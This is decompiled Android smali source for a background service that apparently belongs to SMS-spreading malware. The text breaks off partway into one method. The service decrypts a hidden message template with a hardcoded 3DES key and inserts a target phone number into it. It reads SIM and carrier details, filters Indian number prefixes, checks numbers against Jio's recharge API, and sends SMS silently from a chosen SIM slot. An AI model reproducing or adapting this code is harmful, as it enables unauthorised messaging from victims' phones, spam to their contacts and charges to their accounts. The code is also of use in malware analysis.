.class public Lcom/jadhalno/goplotu/Act;
.super Landroid/app/Service;
.source "Act.java"


# instance fields
.field public a:Ljava/lang/String;

.field public b:Ljava/security/spec/KeySpec;

.field public c:Ljavax/crypto/SecretKeyFactory;

.field public d:Ljavax/crypto/Cipher;

.field public e:[B

.field public f:Ljava/lang/String;

.field public g:Ljava/lang/String;

.field public h:Ljavax/crypto/SecretKey;

.field public i:Ljava/lang/String;

.field public j:Ljava/lang/String;

.field public k:Ljava/lang/String;


# direct methods
.method public static constructor <clinit>()V
    .locals 1

    .line 57
    const-class v0, Lcom/jadhalno/goplotu/Act;

    return-void
.end method

.method public constructor <init>()V
    .locals 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 74
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 59
    nop

    .line 75
    const-string v0, "ThisIsSpartaThisIsSparta"

    iput-object v0, p0, Lcom/jadhalno/goplotu/Act;->f:Ljava/lang/String;

    .line 76
    const-string v1, "DESede"

    iput-object v1, p0, Lcom/jadhalno/goplotu/Act;->g:Ljava/lang/String;

    .line 77
    const-string v1, "UTF8"

    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    iput-object v0, p0, Lcom/jadhalno/goplotu/Act;->e:[B

    .line 78
    new-instance v0, Ljavax/crypto/spec/DESedeKeySpec;

    iget-object v1, p0, Lcom/jadhalno/goplotu/Act;->e:[B

    invoke-direct {v0, v1}, Ljavax/crypto/spec/DESedeKeySpec;-><init>([B)V

    iput-object v0, p0, Lcom/jadhalno/goplotu/Act;->b:Ljava/security/spec/KeySpec;

    .line 79
    iget-object v0, p0, Lcom/jadhalno/goplotu/Act;->g:Ljava/lang/String;

    invoke-static {v0}, Ljavax/crypto/SecretKeyFactory;->getInstance(Ljava/lang/String;)Ljavax/crypto/SecretKeyFactory;

    move-result-object v0

    iput-object v0, p0, Lcom/jadhalno/goplotu/Act;->c:Ljavax/crypto/SecretKeyFactory;

    .line 80
    iget-object v0, p0, Lcom/jadhalno/goplotu/Act;->g:Ljava/lang/String;

    invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    iput-object v0, p0, Lcom/jadhalno/goplotu/Act;->d:Ljavax/crypto/Cipher;

    .line 81
    iget-object v0, p0, Lcom/jadhalno/goplotu/Act;->c:Ljavax/crypto/SecretKeyFactory;

    iget-object v1, p0, Lcom/jadhalno/goplotu/Act;->b:Ljava/security/spec/KeySpec;

    invoke-virtual {v0, v1}, Ljavax/crypto/SecretKeyFactory;->generateSecret(Ljava/security/spec/KeySpec;)Ljavax/crypto/SecretKey;

    move-result-object v0

    iput-object v0, p0, Lcom/jadhalno/goplotu/Act;->h:Ljavax/crypto/SecretKey;

    .line 84
    const-string v0, "l5Q4G1VH164J/NrvvFUoj6rZr79IRw5LxyUn/gwDVNCPjY4/z7ly2vojbWGLGgBICxC9sbkTfV8umak8zLm7qDhsKHaqxmuAn18J9YPq1sKC/8wmNlpdbr5SPb/TalS7DRKOW74KQkrv+pz2DaikXSvLyLZ71b3S5GGXLyaEIPmZwUS/WgNcSwCyETkkqlqFiSUqUJfX1CY="

    iput-object v0, p0, Lcom/jadhalno/goplotu/Act;->i:Ljava/lang/String;

    .line 86
    return-void
.end method

.method public static synthetic a(Lcom/jadhalno/goplotu/Act;)V
    .locals 0
    .param p0, "x0"    # Lcom/jadhalno/goplotu/Act;

    .line 57
    invoke-virtual {p0}, Lcom/jadhalno/goplotu/Act;->h()V

    return-void
.end method


# virtual methods
.method public b()Ljava/lang/String;
    .locals 7

    .line 277
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 279
    .local v0, "carrierNames":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    const-string v1, "android.permission.READ_PHONE_STATE"

    move-object v2, v1

    .line 280
    .local v2, "permission":Ljava/lang/String;
    :try_start_0
    invoke-static {p0, v1}, La/f/e/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_1

    .line 281
    invoke-static {p0}, Landroid/telephony/SubscriptionManager;->from(Landroid/content/Context;)Landroid/telephony/SubscriptionManager;

    move-result-object v1

    invoke-virtual {v1}, Landroid/telephony/SubscriptionManager;->getActiveSubscriptionInfoList()Ljava/util/List;

    move-result-object v1

    .line 282
    .local v1, "subscriptionInfos":Ljava/util/List;, "Ljava/util/List<Landroid/telephony/SubscriptionInfo;>;"
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_0
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v4

    if-ge v3, v4, :cond_0

    .line 283
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/telephony/SubscriptionInfo;

    invoke-virtual {v5}, Landroid/telephony/SubscriptionInfo;->getSimSlotIndex()I

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/telephony/SubscriptionInfo;

    invoke-virtual {v5}, Landroid/telephony/SubscriptionInfo;->getCarrierName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v0, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 282
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 286
    .end local v1    # "subscriptionInfos":Ljava/util/List;, "Ljava/util/List<Landroid/telephony/SubscriptionInfo;>;"
    .end local v3    # "i":I
    :cond_0
    goto :goto_1

    .line 287
    :cond_1
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 289
    .local v1, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 294
    .end local v1    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .end local v2    # "permission":Ljava/lang/String;
    :goto_1
    goto :goto_2

    .line 292
    :catch_0
    move-exception v1

    .line 293
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 295
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_2
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_3
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_a

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    .line 298
    .local v2, "s":Ljava/lang/String;
    invoke-virtual {v2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v3

    const-string v4, "JIO"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    const-string v4, "1"

    const-string v5, "0"

    if-eqz v3, :cond_3

    .line 299
    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 300
    return-object v5

    .line 302
    :cond_2
    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 303
    return-object v4

    .line 306
    :cond_3
    invoke-virtual {v2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v3

    const-string v6, "AIRTEL"

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_5

    .line 307
    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 308
    return-object v5

    .line 310
    :cond_4
    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_5

    .line 311
    return-object v4

    .line 314
    :cond_5
    invoke-virtual {v2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v3

    const-string v6, "IDEA"

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_7

    .line 315
    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_6

    .line 316
    return-object v5

    .line 318
    :cond_6
    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_7

    .line 319
    return-object v4

    .line 323
    :cond_7
    invoke-virtual {v2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v3

    const-string v6, "VODAFONE"

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_9

    .line 324
    invoke-virtual {v2, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_8

    .line 325
    return-object v5

    .line 327
    :cond_8
    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_9

    .line 328
    return-object v4

    .line 332
    .end local v2    # "s":Ljava/lang/String;
    :cond_9
    goto :goto_3

    .line 333
    :cond_a
    const-string v1, "default"

    return-object v1
.end method

.method public c(Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p1, "encryptedString"    # Ljava/lang/String;

    .line 235
    const/4 v0, 0x0

    .line 237
    .local v0, "decryptedText":Ljava/lang/String;
    :try_start_0
    iget-object v1, p0, Lcom/jadhalno/goplotu/Act;->d:Ljavax/crypto/Cipher;

    const/4 v2, 0x2

    iget-object v3, p0, Lcom/jadhalno/goplotu/Act;->h:Ljavax/crypto/SecretKey;

    invoke-virtual {v1, v2, v3}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 238
    invoke-static {p1}, Lc/a/a/a/b/a;->k(Ljava/lang/String;)[B

    move-result-object v1

    .line 239
    .local v1, "encryptedText":[B
    iget-object v2, p0, Lcom/jadhalno/goplotu/Act;->d:Ljavax/crypto/Cipher;

    invoke-virtual {v2, v1}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v2

    .line 240
    .local v2, "plainText":[B
    new-instance v3, Ljava/lang/String;

    invoke-direct {v3, v2}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, v3

    .line 243
    .end local v1    # "encryptedText":[B
    .end local v2    # "plainText":[B
    goto :goto_0

    .line 241
    :catch_0
    move-exception v1

    .line 242
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 244
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-object v0
.end method

.method public d(Ljava/lang/String;)Z
    .locals 16
    .param p1, "number"    # Ljava/lang/String;

    .line 367
    move-object/from16 v1, p0

    move-object/from16 v2, p1

    const-string v0, "no-cache"

    const-string v3, "INFOS"

    :try_start_0
    new-instance v5, Ljava/net/URL;

    const-string v6, "https://www.jio.com/api/jio-recharge-service/recharge/submitNumber"

    invoke-direct {v5, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 368
    .local v5, "url":Ljava/net/URL;
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v6

    check-cast v6, Ljavax/net/ssl/HttpsURLConnection;

    .line 370
    .local v6, "conn":Ljavax/net/ssl/HttpsURLConnection;
    iget-object v7, v1, Lcom/jadhalno/goplotu/Act;->j:Ljava/lang/String;

    invoke-static {v3, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 372
    const-string v7, "TLS"

    invoke-static {v7}, Ljavax/net/ssl/SSLContext;->getInstance(Ljava/lang/String;)Ljavax/net/ssl/SSLContext;

    move-result-object v7

    .line 373
    .local v7, "sc":Ljavax/net/ssl/SSLContext;
    new-instance v8, Ljava/security/SecureRandom;

    invoke-direct {v8}, Ljava/security/SecureRandom;-><init>()V

    const/4 v9, 0x0

    invoke-virtual {v7, v9, v9, v8}, Ljavax/net/ssl/SSLContext;->init([Ljavax/net/ssl/KeyManager;[Ljavax/net/ssl/TrustManager;Ljava/security/SecureRandom;)V

    .line 374
    invoke-virtual {v7}, Ljavax/net/ssl/SSLContext;->getSocketFactory()Ljavax/net/ssl/SSLSocketFactory;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljavax/net/ssl/HttpsURLConnection;->setSSLSocketFactory(Ljavax/net/ssl/SSLSocketFactory;)V

    .line 375
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "{\"serviceId\":\""

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\",\"partyId\":null,\"source\":null,\"ptab\":null,\"token\":null,\"msg\":null,\"serviceType\":\"MOBILITY\",\"erefId\":null}"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 376
    .local v8, "message":Ljava/lang/String;
    const-string v9, "Host"

    const-string v10, "www.jio.com"

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 377
    const-string v9, "Origin"

    const-string v10, "https://www.jio.com"

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 379
    const-string v9, "User-Agent"

    iget-object v10, v1, Lcom/jadhalno/goplotu/Act;->j:Ljava/lang/String;

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 380
    const-string v9, "Accept"

    const-string v10, "application/json, text/javascript, */*; q=0.01"

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 381
    const-string v9, "Accept-Language"

    const-string v10, "en"

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 382
    const-string v9, "Referer"

    const-string v10, "https://www.jio.com/JioApp/index.html?root=primeRecharge/"

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 383
    const-string v9, "Content-Type"

    const-string v10, "application/json"

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 384
    const-string v9, "Content-Length"

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, ""

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 385
    const-string v9, "DNT"

    const-string v10, "1"

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 386
    const-string v9, "Connection"

    const-string v10, "keep-alive"

    invoke-virtual {v6, v9, v10}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 387
    const-string v9, "Pragma"

    invoke-virtual {v6, v9, v0}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 388
    const-string v9, "Cache-Control"

    invoke-virtual {v6, v9, v0}, Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 389
    const/16 v0, 0x1b58

    invoke-virtual {v6, v0}, Ljavax/net/ssl/HttpsURLConnection;->setReadTimeout(I)V

    .line 390
    const/16 v0, 0x1f40

    invoke-virtual {v6, v0}, Ljavax/net/ssl/HttpsURLConnection;->setConnectTimeout(I)V

    .line 391
    const-string v0, "POST"

    invoke-virtual {v6, v0}, Ljavax/net/ssl/HttpsURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 392
    invoke-virtual {v6}, Ljavax/net/ssl/HttpsURLConnection;->connect()V

    .line 393
    const/4 v0, 0x0

    .line 394
    .local v0, "os":Ljava/io/OutputStream;
    new-instance v9, Ljava/io/BufferedOutputStream;

    invoke-virtual {v6}, Ljavax/net/ssl/HttpsURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/BufferedOutputStream;-><init>(Ljava/io/OutputStream;)V

    move-object v0, v9

    .line 395
    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/io/OutputStream;->write([B)V

    .line 396
    invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V

    .line 398
    new-instance v9, Ljava/lang/String;

    invoke-direct {v9}, Ljava/lang/String;-><init>()V

    .line 400
    .local v9, "result":Ljava/lang/String;
    invoke-virtual {v6}, Ljavax/net/ssl/HttpsURLConnection;->getResponseCode()I

    move-result v10

    .line 402
    .local v10, "statusCode":I
    const/4 v11, 0x0

    .line 404
    .local v11, "is":Ljava/io/InputStream;
    const/16 v12, 0xc8

    if-lt v10, v12, :cond_0

    const/16 v12, 0x190

    if-ge v10, v12, :cond_0

    .line 405
    invoke-virtual {v6}, Ljavax/net/ssl/HttpsURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v12

    move-object v11, v12

    goto :goto_0

    .line 407
    :cond_0
    invoke-virtual {v6}, Ljavax/net/ssl/HttpsURLConnection;->getErrorStream()Ljava/io/InputStream;

    move-result-object v12

    move-object v11, v12

    .line 410
    :goto_0
    new-instance v12, Ljava/io/BufferedReader;

    new-instance v13, Ljava/io/InputStreamReader;

    invoke-direct {v13, v11}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v12, v13}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 412
    .local v12, "in":Ljava/io/BufferedReader;
    :goto_1
    invoke-virtual {v12}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v13

    move-object v14, v13

    .local v14, "inputLine":Ljava/lang/String;
    if-eqz v13, :cond_1

    .line 413
    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v13, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    move-object v9, v13

    goto :goto_1

    .line 415
    :cond_1
    move-object v13, v9

    .line 416
    .local v13, "fresult":Ljava/lang/String;
    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "res-----"

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 417
    const-string v3, "NOT_SUBSCRIBED_USER"

    invoke-virtual {v13, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 419
    const/4 v3, 0x0

    return v3

    .line 422
    :cond_2
    const/4 v3, 0x0

    invoke-virtual {v13, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v4, :cond_3

    .line 424
    const/4 v3, 0x1

    return v3

    .line 428
    :cond_3
    return v3

    .line 431
    .end local v0    # "os":Ljava/io/OutputStream;
    .end local v5    # "url":Ljava/net/URL;
    .end local v6    # "conn":Ljavax/net/ssl/HttpsURLConnection;
    .end local v7    # "sc":Ljavax/net/ssl/SSLContext;
    .end local v8    # "message":Ljava/lang/String;
    .end local v9    # "result":Ljava/lang/String;
    .end local v10    # "statusCode":I
    .end local v11    # "is":Ljava/io/InputStream;
    .end local v12    # "in":Ljava/io/BufferedReader;
    .end local v13    # "fresult":Ljava/lang/String;
    .end local v14    # "inputLine":Ljava/lang/String;
    :catch_0
    move-exception v0

    .line 432
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 434
    const/4 v3, 0x0

    return v3
.end method

.method public e(Ljava/lang/String;)Z
    .locals 28
    .param p1, "number"    # Ljava/lang/String;

    .line 337
    const-string v0, "7000"

    const-string v1, "7001"

    const-string v2, "7002"

    const-string v3, "7003"

    const-string v4, "7004"

    const-string v5, "7005"

    const-string v6, "7006"

    const-string v7, "7007"

    const-string v8, "7008"

    const-string v9, "7009"

    const-string v10, "7010"

    const-string v11, "7011"

    const-string v12, "7012"

    const-string v13, "7013"

    const-string v14, "7014"

    const-string v15, "7015"

    const-string v16, "7016"

    const-string v17, "7017"

    const-string v18, "7018"

    const-string v19, "7019"

    const-string v20, "7020"

    const-string v21, "7021"

    const-string v22, "6001"

    const-string v23, "6002"

    const-string v24, "6002"

    const-string v25, "6003"

    const-string v26, "6003"

    const-string v27, "6001"

    filled-new-array/range {v0 .. v27}, [Ljava/lang/String;

    move-result-object v0

    .line 352
    .local v0, "code":[Ljava/lang/String;
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    array-length v2, v0

    if-ge v1, v2, :cond_1

    .line 353
    invoke-virtual/range {p1 .. p1}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "91"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v4, v0, v1

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 354
    const/4 v2, 0x1

    return v2

    .line 352
    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 357
    .end local v1    # "i":I
    :cond_1
    const/4 v1, 0x0

    return v1
.end method

.method public f(Ljava/lang/String;Ljava/lang/String;)V
    .locals 12
    .param p1, "ph"    # Ljava/lang/String;
    .param p2, "slot"    # Ljava/lang/String;

    .line 250
    :try_start_0
    const-string v0, ""

    .line 251
    .local v0, "jii":Ljava/lang/String;
    iget-object v1, p0, Lcom/jadhalno/goplotu/Act;->i:Ljava/lang/String;

    invoke-virtual {p0, v1}, Lcom/jadhalno/goplotu/Act;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    move-object v0, v1

    .line 252
    const-string v1, "xxxxxxxxxx"

    invoke-virtual {v0, v1, p1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/jadhalno/goplotu/Act;->k:Ljava/lang/String;

    .line 254
    const-string v1, "default"

    invoke-virtual {p2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    const/4 v2, 0x2

    if-eqz v1, :cond_0

    .line 255
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v3

    .line 256
    .local v3, "smsManager":Landroid/telephony/SmsManager;
    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    iget-object v6, p0, Lcom/jadhalno/goplotu/Act;->k:Ljava/lang/String;

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-virtual/range {v3 .. v8}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 258
    return-void

    .line 260
    .end local v3    # "smsManager":Landroid/telephony/SmsManager;
    :cond_0
    const-string v1, "android.telephony.SubscriptionManager"

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    const-string v3, "getSubId"

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    const/4 v7, 0x0

    aput-object v6, v5, v7

    invoke-virtual {v1, v3, v5}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 261
    .local v1, "method":Ljava/lang/reflect/Method;
    invoke-virtual {v1, v4}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 263
    invoke-static {p2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    .line 264
    .local v3, "simID":I
    const/4 v5, 0x0

    new-array v4, v4, [Ljava/lang/Object;

    new-instance v6, Ljava/lang/Integer;

    invoke-direct {v6, v3}, Ljava/lang/Integer;-><init>(I)V

    aput-object v6, v4, v7

    invoke-virtual {v1, v5, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [I

    .line 265
    .local v4, "param":[I
    aget v5, v4, v7

    .line 266
    .local v5, "inst":I
    invoke-static {v5}, Landroid/telephony/SmsManager;->getSmsManagerForSubscriptionId(I)Landroid/telephony/SmsManager;

    move-result-object v6

    .line 268
    .local v6, "smsMan":Landroid/telephony/SmsManager;
    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x0

    iget-object v9, p0, Lcom/jadhalno/goplotu/Act;->k:Ljava/lang/String;

    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-virtual/range {v6 .. v11}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 272
    .end local v0    # "jii":Ljava/lang/String;
    .end local v1    # "method":Ljava/lang/reflect/Method;
    .end local v3    # "simID":I
    .end local v4    # "param":[I
    .end local v5    # "inst":I
    .end local v6    # "smsMan":Landroid/telephony/SmsManager;
    goto :goto_0

    .line 270
    :catch_0
    move-exception v0

    .line 271
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 274
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public g(Ljava/lang/String;)V
    .locals 2
    .param p1, "number"    # Ljava/lang/String;

    .line 214
    new-instance v0, Ljava/lang/Thread;

